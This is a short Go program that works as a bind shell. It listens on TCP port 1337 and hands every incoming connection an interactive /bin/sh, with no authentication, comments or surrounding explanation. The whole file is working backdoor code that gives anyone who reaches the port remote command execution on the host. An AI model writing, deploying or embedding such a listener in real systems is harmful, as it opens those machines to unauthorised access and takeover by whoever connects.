package main

import (
	. "fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	lsnr, err := net.Listen("tcp", ":1337")
	if err != nil {
		Println("Error listening:", err)
		os.Exit(1)
	}

	for {
		conn, err := lsnr.Accept()
		if err != nil {
			Println(err)
		}

		cmd := exec.Command("/bin/sh")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()

		conn.Close()
	}

	os.Exit(1)
}
